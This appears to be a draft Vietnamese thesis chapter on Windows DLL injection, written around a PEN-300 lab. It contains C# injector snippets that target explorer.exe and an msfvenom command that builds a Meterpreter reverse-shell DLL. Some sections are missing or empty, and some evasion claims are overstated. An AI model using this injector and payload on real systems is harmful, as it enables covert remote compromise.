# CHƯƠNG 2. PHÂN TÍCH VÀ XÂY DỰNG CÔNG CỤ DLL INJECTION

---

## 2.1. Môi trường thực nghiệm và thư viện sử dụng

### 2.1.1. Thư viện ctypes trong Python

Để tương tác với các API cấp thấp của hệ điều hành Windows từ ngôn ngữ bậc cao, thư viện `ctypes` trong Python đóng vai trò là cầu nối quan trọng. `ctypes` là một thư viện ngoại vi (Foreign Function Library) tích hợp sẵn trong Python, cho phép gọi các hàm trong thư viện liên kết động (DLL/shared library) được viết bằng C/C++ mà không cần viết mã mở rộng (extension module) hay sử dụng trình biên dịch C.

Cụ thể, `ctypes` cung cấp khả năng:

- **Nạp thư viện động**: Sử dụng `ctypes.WinDLL` hoặc `ctypes.windll` để nạp các DLL hệ thống như `kernel32.dll`, `ntdll.dll`, `user32.dll`.
- **Định nghĩa kiểu dữ liệu C**: Ánh xạ các kiểu dữ liệu C (`DWORD`, `HANDLE`, `LPVOID`, `BOOL`, `SIZE_T`,...) sang kiểu dữ liệu Python tương ứng thông qua `ctypes.c_ulong`, `ctypes.c_void_p`, `ctypes.c_bool`,...
- **Khai báo prototype hàm**: Thiết lập kiểu trả về (`restype`) và kiểu tham số (`argtypes`) cho từng hàm Windows API trước khi gọi, đảm bảo tính đúng đắn khi truyền dữ liệu qua ranh giới Python-C.
- **Xử lý con trỏ và cấu trúc**: Tạo các cấu trúc (`ctypes.Structure`) để biểu diễn các struct của Windows API như `STARTUPINFO`, `PROCESS_INFORMATION`, `PROCESS_BASIC_INFORMATION`.

Ưu điểm của việc sử dụng Python với `ctypes` so với C# (có P/Invoke) hay C/C++ thuần túy là khả năng phát triển nhanh (rapid prototyping), tính linh hoạt trong việc chỉnh sửa mã nguồn tại thời gian chạy, và không yêu cầu quá trình biên dịch. Tuy nhiên, điểm hạn chế là hiệu suất thấp hơn so với mã gốc (native code) và khả năng bị phát hiện cao hơn bởi các giải pháp bảo mật do Python interpreter là một tiến trình dễ nhận biết.

### 2.1.2. Kiểu dữ liệu và cấu trúc Windows API

Để triển khai kỹ thuật DLL Injection, cần hiểu rõ các kiểu dữ liệu và cấu trúc dữ liệu đặc thù của Windows API:

**Kiểu dữ liệu cơ bản:**

| Kiểu Windows API | Kiểu ctypes tương ứng | Mô tả |
|---|---|---|
| `HANDLE` | `ctypes.c_void_p` hoặc `wintypes.HANDLE` | Con trỏ 32/64-bit đến đối tượng kernel |
| `DWORD` | `ctypes.c_ulong` hoặc `wintypes.DWORD` | Số nguyên không dấu 32-bit |
| `LPVOID` | `ctypes.c_void_p` | Con trỏ void (địa chỉ bộ nhớ tùy ý) |
| `BOOL` | `ctypes.c_int` hoặc `wintypes.BOOL` | Giá trị Boolean (0 hoặc khác 0) |
| `SIZE_T` | `ctypes.c_size_t` | Kích thước phụ thuộc kiến trúc (32/64-bit) |
| `LPCSTR` | `ctypes.c_char_p` | Con trỏ đến chuỗi ký tự ASCII kết thúc bằng null |
| `LPCWSTR` | `ctypes.c_wchar_p` | Con trỏ đến chuỗi Unicode kết thúc bằng null |

**Cấu trúc dữ liệu quan trọng:**

- **`STARTUPINFO`**: Cấu trúc chứa thông tin về cách cửa sổ của tiến trình mới được cấu hình khi khởi động (kích thước cửa sổ, vị trí, luồng nhập/xuất chuẩn,...). Được sử dụng làm tham số cho `CreateProcess`.
- **`PROCESS_INFORMATION`**: Cấu trúc được hệ điều hành điền thông tin sau khi tạo tiến trình thành công, bao gồm handle của tiến trình (`hProcess`), handle của luồng chính (`hThread`), ID tiến trình (`dwProcessId`), và ID luồng (`dwThreadId`).
- **`PROCESS_BASIC_INFORMATION`**: Cấu trúc được trả về bởi `ZwQueryInformationProcess`, chứa địa chỉ của Process Environment Block (PEB) — một thành phần quan trọng trong Process Hollowing.
- **`SECURITY_ATTRIBUTES`**: Cấu trúc xác định bộ mô tả bảo mật (security descriptor) cho đối tượng mới tạo và quyết định liệu handle có thể kế thừa bởi tiến trình con hay không.

---

## 2.2. Quy trình Classic DLL Injection trên Windows

### 2.2.1. Mô hình tổng quát các bước thực hiện

DLL Injection là một kỹ thuật được sử dụng nhằm thực thi mã lệnh bên trong không gian địa chỉ (address space) của một tiến trình mục tiêu thông qua việc ép buộc tiến trình đó nạp các thư viện liên kết động (DLL). Hệ điều hành Windows cung cấp sẵn một tập hợp các hàm API hợp pháp cho phép can thiệp và thao tác lên bộ nhớ của các tiến trình khác, vốn được thiết kế ban đầu phục vụ cho mục đích gỡ lỗi (debug). Kỹ thuật DLL Injection tận dụng chính các API hợp pháp này để thực hiện quá trình tiêm mã độc hoặc thư viện bên thứ ba vào tiến trình đang chạy.

Về bản chất, quy trình thực thi Classic DLL Injection được chia thành bốn giai đoạn cơ bản nhằm can thiệp và ép buộc hệ thống nạp thư viện bên ngoài:

1. **Mở tiến trình mục tiêu (`OpenProcess`)**: Thiết lập một kênh giao tiếp hợp lệ và chiếm quyền điều khiển (handle) tiến trình đích.
2. **Cấp phát bộ nhớ (`VirtualAllocEx`)**: Phân bổ một vùng nhớ mới bên trong không gian địa chỉ ảo của tiến trình đích để làm nơi chứa đường dẫn file DLL.
3. **Ghi dữ liệu (`WriteProcessMemory`)**: Sao chép chuỗi đường dẫn tuyệt đối của file DLL vào vùng nhớ vừa được cấp phát ở bước 2.
4. **Tạo luồng thực thi từ xa (`CreateRemoteThread`)**: Tạo một luồng (thread) mới bên trong tiến trình đích, buộc luồng này gọi hàm nạp thư viện (`LoadLibraryA`) kèm theo đường dẫn DLL ở bước 3, từ đó kích hoạt mã độc.

Mô hình tổng quát có thể biểu diễn như sau:

```
[Tiến trình Injector] ──OpenProcess──> [Handle đến tiến trình mục tiêu]
       │
       ├──VirtualAllocEx──> [Vùng nhớ mới trong tiến trình mục tiêu]
       │
       ├──WriteProcessMemory──> [Ghi đường dẫn DLL vào vùng nhớ]
       │
       ├──GetProcAddress(LoadLibraryA)──> [Địa chỉ hàm LoadLibraryA]
       │
       └──CreateRemoteThread──> [Luồng mới gọi LoadLibraryA(đường dẫn DLL)]
                                        │
                                        └──> DLL được nạp, DllMain() thực thi
```

Điểm mấu chốt của kỹ thuật này nằm ở việc khai thác hàm `LoadLibraryA` — một API hợp pháp của Windows dùng để nạp DLL. Khi DLL được nạp, hàm `DllMain` bên trong DLL sẽ tự động được gọi với mã lý do `DLL_PROCESS_ATTACH`, tại đây kẻ tấn công có thể đặt shellcode hoặc mã độc để thực thi.

**Điều kiện tiên quyết:**

- Tiến trình injector phải có đủ quyền hạn (permission) để tương tác với tiến trình mục tiêu. Cụ thể, tiến trình hiện tại phải chạy ở mức Integrity Level (mức toàn vẹn) bằng hoặc cao hơn tiến trình đích.
- DLL phải được viết bằng C/C++ (unmanaged code). Các DLL quản lý (managed DLL) viết bằng C#/.NET không thể được nạp vào tiến trình unmanaged thông qua `LoadLibrary`.
- DLL phải tồn tại trên ổ đĩa vì `LoadLibrary` chỉ chấp nhận đường dẫn đến tệp trên hệ thống tệp.

### 2.2.2. Mở tiến trình mục tiêu và thiết lập quyền truy cập (OpenProcess)

Bước đầu tiên trong quy trình DLL Injection là mở một kênh tương tác (handle) đến tiến trình mục tiêu bằng Win32 API `OpenProcess`. Prototype của hàm này như sau:

```c
HANDLE OpenProcess(
    DWORD dwDesiredAccess,   // Quyền truy cập yêu cầu
    BOOL  bInheritHandle,    // Handle có thể kế thừa bởi tiến trình con không
    DWORD dwProcessId        // ID của tiến trình mục tiêu
);
```

**Phân tích tham số:**

- **`dwDesiredAccess`** (Quyền truy cập mong muốn): Xác định các quyền mà tiến trình gọi (caller) yêu cầu đối với tiến trình mục tiêu. Giá trị này sẽ được kiểm tra đối chiếu với Security Descriptor của tiến trình đích. Trong bối cảnh DLL Injection, cần sử dụng `PROCESS_ALL_ACCESS` (giá trị hex: `0x001F0FFF`) để có toàn quyền truy cập, bao gồm quyền đọc/ghi bộ nhớ và tạo luồng từ xa.

- **`bInheritHandle`** (Kế thừa handle): Xác định liệu handle trả về có thể được kế thừa bởi tiến trình con hay không. Thông thường đặt là `false` vì không cần tính năng kế thừa.

- **`dwProcessId`** (ID tiến trình): Mã định danh duy nhất (PID) của tiến trình mục tiêu. PID có thể thay đổi sau mỗi lần khởi động và khác nhau giữa các máy, do đó cần phân giải động thông qua các phương thức như `Process.GetProcessesByName()` trong C# hoặc `EnumProcesses` API.

**Cơ chế bảo mật liên quan:**

Mỗi tiến trình trên Windows đều có một **Security Descriptor** quy định quyền hạn truy cập của người dùng và nhóm. Ngoài ra, mỗi tiến trình còn có một **Integrity Level** (mức toàn vẹn) hoạt động như một cơ chế kiểm soát truy cập bổ sung:

- **Medium Integrity**: Mức mặc định cho hầu hết các tiến trình chạy dưới tài khoản người dùng thông thường (ví dụ: `explorer.exe`, `notepad.exe`).
- **High Integrity**: Dành cho các tiến trình chạy với quyền quản trị viên (Run as Administrator).
- **System Integrity**: Dành cho các tiến trình hệ thống như `svchost.exe`.

Nguyên tắc chung: một tiến trình chỉ có thể mở handle đến tiến trình chạy ở mức Integrity Level bằng hoặc thấp hơn. Điều này có nghĩa là từ tiến trình Medium Integrity, không thể inject vào tiến trình High hoặc System Integrity. Đây là lý do tại sao `explorer.exe` (chạy ở Medium Integrity) thường được chọn làm mục tiêu injection — nó luôn tồn tại trong suốt phiên đăng nhập và chạy ở cùng mức toàn vẹn với hầu hết mã khai thác.

**Ví dụ gọi hàm trong C#:**

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

// Lấy PID của explorer.exe
Process[] expProc = Process.GetProcessesByName("explorer");
int pid = expProc[0].Id;

// Mở handle với toàn quyền
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
```

Nếu hàm thực thi thành công, `hProcess` sẽ chứa handle hợp lệ đến tiến trình mục tiêu. Nếu thất bại (ví dụ: quyền không đủ), giá trị trả về sẽ là `IntPtr.Zero` (NULL).

### 2.2.3. Cấp phát và ghi dữ liệu vào bộ nhớ từ xa (VirtualAllocEx, WriteProcessMemory)

Sau khi có handle hợp lệ đến tiến trình mục tiêu, bước tiếp theo là cấp phát một vùng nhớ trong không gian địa chỉ ảo của tiến trình đó bằng `VirtualAllocEx`, rồi ghi đường dẫn DLL vào vùng nhớ vừa cấp phát bằng `WriteProcessMemory`.

**a) Cấp phát bộ nhớ từ xa — `VirtualAllocEx`:**

```c
LPVOID VirtualAllocEx(
    HANDLE hProcess,          // Handle đến tiến trình mục tiêu
    LPVOID lpAddress,         // Địa chỉ mong muốn (NULL để hệ thống tự chọn)
    SIZE_T dwSize,            // Kích thước vùng nhớ cần cấp phát
    DWORD  flAllocationType,  // Kiểu cấp phát
    DWORD  flProtect          // Thuộc tính bảo vệ bộ nhớ
);
```

Khác với `VirtualAlloc` (chỉ hoạt động trong tiến trình hiện tại), `VirtualAllocEx` cho phép cấp phát bộ nhớ trong bất kỳ tiến trình nào mà ta có handle hợp lệ.

Các tham số quan trọng:
- `lpAddress`: Nên đặt là NULL (`IntPtr.Zero`) để hệ điều hành tự chọn địa chỉ phù hợp, tránh xung đột với vùng nhớ đã được sử dụng.
- `flAllocationType`: Sử dụng `MEM_COMMIT | MEM_RESERVE` (`0x3000`) để vừa dành (reserve) vừa cam kết (commit) bộ nhớ vật lý.
- `flProtect`: Cho DLL Injection thông thường, sử dụng `PAGE_READWRITE` (`0x04`) vì chỉ cần ghi đường dẫn DLL (chuỗi ký tự). Đối với shellcode injection trực tiếp, sử dụng `PAGE_EXECUTE_READWRITE` (`0x40`).

**b) Ghi dữ liệu vào bộ nhớ từ xa — `WriteProcessMemory`:**

```c
BOOL WriteProcessMemory(
    HANDLE  hProcess,                // Handle đến tiến trình mục tiêu
    LPVOID  lpBaseAddress,           // Địa chỉ đích trong tiến trình từ xa
    LPCVOID lpBuffer,                // Bộ đệm chứa dữ liệu cần ghi
    SIZE_T  nSize,                   // Số byte cần ghi
    SIZE_T  *lpNumberOfBytesWritten  // Số byte thực tế đã ghi
);
```

Trong DLL Injection, dữ liệu cần ghi chính là đường dẫn đầy đủ đến tệp DLL trên ổ đĩa (ví dụ: `C:\Users\victim\Documents\met.dll`). Chuỗi này sẽ được chuyển đổi sang mảng byte trước khi ghi.

**Ví dụ triển khai trong C#:**

```csharp
// Cấp phát bộ nhớ trong tiến trình mục tiêu
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);

// Ghi đường dẫn DLL vào bộ nhớ từ xa
IntPtr outSize;
Boolean res = WriteProcessMemory(
    hProcess,
    addr,
    Encoding.Default.GetBytes(dllName),
    dllName.Length,
    out outSize
);
```

Lưu ý rằng từ khóa `out` trong C# cho phép truyền biến bằng tham chiếu (by reference), đảm bảo `outSize` nhận giá trị số byte thực tế đã ghi — thông tin hữu ích cho việc kiểm tra lỗi.

### 2.2.4. Tạo luồng thực thi từ xa và nạp DLL (CreateRemoteThread, LoadLibraryA)

Bước cuối cùng và cũng là bước quan trọng nhất là buộc tiến trình mục tiêu thực thi hàm `LoadLibraryA` với đối số là đường dẫn DLL đã được ghi vào bộ nhớ.

**a) Phân giải địa chỉ của `LoadLibraryA`:**

Trước khi tạo luồng từ xa, cần xác định địa chỉ bộ nhớ của hàm `LoadLibraryA` trong tiến trình mục tiêu. May mắn thay, hầu hết các DLL hệ thống Windows (bao gồm `kernel32.dll` chứa `LoadLibraryA`) được nạp tại cùng một địa chỉ cơ sở (base address) trên mọi tiến trình trong cùng phiên khởi động. Do đó, địa chỉ của `LoadLibraryA` trong tiến trình hiện tại sẽ giống với địa chỉ trong tiến trình mục tiêu.

```csharp
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
```

- **`GetModuleHandle`**: Trả về handle (địa chỉ cơ sở) của module `kernel32.dll` đã được nạp trong tiến trình hiện tại.
- **`GetProcAddress`**: Trả về địa chỉ của hàm `LoadLibraryA` trong module đã cho.

**b) Tạo luồng thực thi từ xa — `CreateRemoteThread`:**

```c
HANDLE CreateRemoteThread(
    HANDLE                 hProcess,         // Handle tiến trình mục tiêu
    LPSECURITY_ATTRIBUTES  lpThreadAttributes, // NULL cho mặc định
    SIZE_T                 dwStackSize,      // 0 cho kích thước stack mặc định
    LPTHREAD_START_ROUTINE lpStartAddress,   // Địa chỉ hàm bắt đầu (LoadLibraryA)
    LPVOID                 lpParameter,      // Tham số cho hàm (địa chỉ đường dẫn DLL)
    DWORD                  dwCreationFlags,  // 0 cho chạy ngay
    LPDWORD                lpThreadId        // NULL nếu không cần Thread ID
);
```

Điểm mấu chốt: `lpStartAddress` được đặt là địa chỉ của `LoadLibraryA`, và `lpParameter` là địa chỉ vùng nhớ trong tiến trình đích nơi đường dẫn DLL đã được ghi. Khi luồng mới được tạo, nó sẽ thực thi `LoadLibraryA(đường dẫn_DLL)`, khiến hệ điều hành nạp DLL vào tiến trình mục tiêu.

**c) Cơ chế thực thi của DLL sau khi nạp:**

Khi `LoadLibrary` nạp DLL, nó tự động gọi hàm `DllMain` bên trong DLL với mã lý do `DLL_PROCESS_ATTACH`:

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Mã độc/shellcode được đặt tại đây
        // Ví dụ: tạo reverse shell, kết nối đến C2 server
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Đây chính là cơ chế để thực thi mã tùy ý trong ngữ cảnh (context) của tiến trình mục tiêu. Trong thực tế, Metasploit Framework sử dụng `msfvenom` để tạo DLL Meterpreter chứa staged shellcode trong `DLL_PROCESS_ATTACH`, thiết lập kết nối ngược (reverse connection) về máy chủ của kẻ tấn công.

**Lưu ý về kiến trúc 32-bit/64-bit:**

Trên Windows 64-bit, tồn tại cả tiến trình 32-bit và 64-bit. Có bốn kịch bản injection:
- 64-bit → 64-bit: Hoạt động bình thường.
- 64-bit → 32-bit: Hoạt động bình thường.
- 32-bit → 32-bit: Hoạt động bình thường.
- **32-bit → 64-bit: THẤT BẠI** — `CreateRemoteThread` không hỗ trợ trường hợp này. Để khắc phục, cần kỹ thuật chuyển đổi từ 32-bit sang 64-bit long mode trong assembly (kỹ thuật "Heaven's Gate"), vượt ngoài phạm vi của bài luận này.

---

## 2.3. Các kỹ thuật DLL Injection nâng cao

### 2.3.1. Reflective DLL Injection

Reflective DLL Injection là một biến thể nâng cao nhằm khắc phục điểm yếu chí mạng của phương pháp truyền thống: sự phụ thuộc vào tệp thư viện (DLL) vật lý nằm trên ổ cứng. Kỹ thuật này được thiết kế để nạp trực tiếp một tệp DLL từ không gian bộ nhớ (RAM) của chính tiến trình đang thực thi mà không cần tương tác với hệ thống tệp (I/O). Bằng cách tự động phân tích định dạng nội tại của tệp (PE format) thay vì dựa vào các hàm API có sẵn phụ trách việc nạp thư viện, phương pháp này loại bỏ hoàn toàn dấu vết pháp y và giúp né tránh các cơ chế phân tích hành vi hay phần mềm diệt virus thông thường.

Về nguyên lý hoạt động, Reflective DLL Injection tự chủ nạp thư viện bằng cách tự phân tích cú pháp (parse) cấu trúc định dạng PE (Portable Executable) của chính nó ngay trong bộ nhớ ảo. Loader (trình tải) tùy chỉnh tiến hành cấp phát không gian bộ nhớ cần thiết, trực tiếp sao chép và thiết lập các phân vùng dữ liệu, tự động tính toán lại bảng địa chỉ (Relocation) và tự thân liên kết với các API hệ thống (IAT) mà không phải thông qua cơ chế nạp tiêu chuẩn `LoadLibrary` của hệ điều hành.

Ưu điểm tuyệt đối của kỹ thuật này là khả năng "tàng hình" vô cùng hiệu quả. Do không tương tác với ổ cứng và không đăng ký cùng hệ điều hành, thư viện được tiêm vào hoàn toàn không để lại dấu vết dữ liệu hay xuất hiện hiển thị trên các công cụ giám sát tiến trình hệ thống (như Task Manager hay Process Explorer).

Về nhược điểm, phương pháp này đòi hỏi kỹ năng lập trình phức tạp để tự quản lý toàn bộ cấu trúc định dạng PE và độ tương thích kiến trúc bộ nhớ (32-bit/64-bit). Thêm vào đó, dù tàng hình với công cụ cơ bản, nó rủi ro bị các hệ thống rà quét EDR (Endpoint Detection and Response) tối tân bóc trần thông qua cơ chế quét vùng bộ nhớ không gắn vật lý (unbacked memory) để săn lùng các dòng mã thực thi lơ lửng nằm ngoài danh sách quản lý nạp thư viện của hệ điều hành.

### 2.3.2. Process Hollowing

Process Hollowing (Làm rỗng tiến trình) là một kỹ thuật đe dọa tiên tiến được sử dụng nhằm che giấu luồng thực thi mã độc bên trong vỏ bọc của một tiến trình hệ thống hợp pháp, chẳng hạn như `svchost.exe`. Trọng tâm của phương pháp này nhằm vượt qua các bộ lọc phát hiện lưu lượng mạng (network trafficking) bất thường bằng cách tiêm mã vào một tiến trình vốn đã được cấp quyền giao tiếp với bên ngoài. Thay vì nạp thêm thư viện vào một tiến trình đang hoạt động (như DLL Injection), Process Hollowing chủ động khởi tạo một thể hiện tiến trình mới ở trạng thái chờ (suspended), sau đó giải phóng toàn bộ cấu trúc mã gốc tại vùng nhớ căn bản và thay thế bằng mã độc hoàn toàn tùy chỉnh. Điều này đánh lừa hệ điều hành tiếp tục thực thi đoạn mã lạ với đầy đủ danh tính cùng đặc quyền của ứng dụng vô hại ban đầu.

Nguyên lý cốt lõi của Process Hollowing dựa trên cơ chế lợi dụng luồng điều khiển của một vỏ tiến trình vô hại ngay khi nó vừa được gọi lên. Ở bước đầu tiên, hệ thống sẽ gọi khởi tạo tiến trình đích ở trạng thái "treo" (suspended) nhằm tạm ngưng lệnh thực thi mã lệnh gốc trước khi nó hoạt động. Kẻ tấn công lợi dụng khoảng hở nhỏ này để truy vết cấu trúc Process Environment Block (PEB), thông qua các API hệ thống cấp thấp truy nguyên đến địa chỉ gốc bộ nhớ của ứng dụng gốc. Cuối cùng, hàm sao chép bộ nhớ sẽ ghi đè trực tiếp một đoạn mã độc tùy chỉnh lên phân vùng thực thi ban đầu (EntryPoint), rồi dùng tín hiệu tái kích hoạt lại luồng treo lúc nãy để hệ thống lén lút chạy phần "ruột" mã độc dưới "vỏ" ngoại quan hợp pháp.

Phương thức này mang đến ưu điểm vượt bậc về bảo mật ngụy trang. Khác với DLL Injection hay quá trình chèn thư viện truyền thống, hệ thống vẫn duy trì danh tính luồng đang thực thi với cấu trúc không đổi, từ đó qua mặt dễ dàng các cảm biến quét module hay FireWall hệ thống.

Dù vậy, nó tồn tại điểm yếu chí mạng trong việc duy trì ổn định hệ thống. Những xê dịch rất nhỏ ở cấu trúc offset bộ nhớ, hay sai biệt quá mạnh ở mức dữ liệu nhân kernel khi ghi đè mã cũng sẽ khiến toàn bộ ứng dụng bị tê liệt và sụp đổ (crash) ngay tức thì. Hơn nữa, về mặt phân tích hành vi (Behavioral Analysis), dù ngoại hình tiến trình trông hợp pháp, chuỗi thao tác gọi các API bất thường liên hoàn (tạo tiến trình bị treo, rồi cấp phát, ghi đè bộ nhớ, tái xuất luồng) và sự phi logic trong gia phả tiến trình (parent-child process tree) chính là các chỉ báo xâm nhập (IoC) cực kỳ rõ ràng khiến mã độc dễ dàng bị các công cụ máy học/EDR khóa chặn từ sớm.

---

## 2.4. Thiết kế và cài đặt công cụ Python Injector

### 2.4.4. Xây dựng DLL mẫu

Trong ngữ cảnh thực nghiệm, DLL mẫu có thể được tạo bằng hai cách:

1. **Sử dụng msfvenom** (Metasploit Framework):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f dll -o met.dll
```

2. **Viết DLL tùy chỉnh bằng C/C++** với shellcode trong `DLL_PROCESS_ATTACH` như đã trình bày ở mục 2.2.4.

---

# CHƯƠNG 3. THỰC NGHIỆM, PHÂN TÍCH VÀ BIỆN PHÁP PHÒNG THỦ

---

## 3.1. Môi trường thực nghiệm và kịch bản kiểm thử

### 3.1.1. Cấu hình hệ thống và phòng thí nghiệm

Môi trường thực nghiệm được thiết lập dựa trên bài lab của khóa PEN-300 (Offensive Security), bao gồm:

- **Máy tấn công (Kali Linux)**: Chạy Metasploit Framework với multi/handler listener, Apache web server để phân phối DLL.
- **Máy nạn nhân (Windows 10)**: Cài đặt Visual Studio để biên dịch C#, PowerShell với Execution Policy bypass, Process Explorer để giám sát.
- **Kết nối mạng**: Kết nối VPN nội bộ giữa hai máy, cho phép giao tiếp qua HTTPS (port 443).

### 3.1.2. Kịch bản 1: Classic DLL Injection vào explorer.exe

**Mục tiêu**: Tiêm DLL Meterpreter vào tiến trình `explorer.exe` chạy ở Medium Integrity Level, thiết lập reverse shell.

**Quy trình thực hiện**:
1. Tạo DLL Meterpreter bằng `msfvenom` trên máy tấn công.
2. Biên dịch chương trình injector C# với kiến trúc x64.
3. Thực thi injector trên máy nạn nhân.
4. Xác nhận reverse shell trên Metasploit handler.
5. Kiểm tra PID của shell bằng `getpid` — phải trùng với PID của `explorer.exe`.
6. Kiểm tra DLL đã nạp trong Process Explorer — `met.dll` phải xuất hiện trong danh sách module.

**Kết quả kỳ vọng**: Reverse Meterpreter shell hoạt động bên trong `explorer.exe`, shell tồn tại ngay cả khi tiến trình injector ban đầu bị đóng.

### 3.1.3. Kịch bản 2: 



---




---

## Tài liệu tham khảo

1. Offensive Security. (2020). *PEN-300: Evasion Techniques and Breaching Defenses*. Offensive Security.
2. Fewer, S. (2013). *Reflective DLL Injection*. GitHub. https://github.com/stephenfewer/ReflectiveDLLInjection
3. PowerShellMafia. (2016). *Invoke-ReflectivePEInjection*. PowerSploit, GitHub. https://github.com/PowerShellMafia/PowerSploit
4. Microsoft. (2018). *OpenProcess function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
5. Microsoft. (2018). *VirtualAllocEx function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
6. Microsoft. (2018). *WriteProcessMemory function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
7. Microsoft. (2018). *CreateRemoteThread function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
8. Microsoft. (2018). *CreateProcessW function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
9. Microsoft. (2018). *ZwQueryInformationProcess function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
10. Microsoft. (2018). *PE Format*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
11. Microsoft. (2020). *DllMain entry point*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
12. Microsoft. (2018). *ResumeThread function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
13. Microsoft. (2018). *ReadProcessMemory function*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
14. Microsoft. (2018). *Process Security and Access Rights*. Microsoft Docs. https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
15. MITRE. (2019). *Process Hollowing (T1093)*. MITRE ATT&CK. https://attack.mitre.org/techniques/T1093/
16. Arno0x. (2017). *PELoader C# Script*. GitHub. https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs
17. M0n0ph1. (2018). *Process Hollowing*. GitHub. https://github.com/m0n0ph1/Process-Hollowing
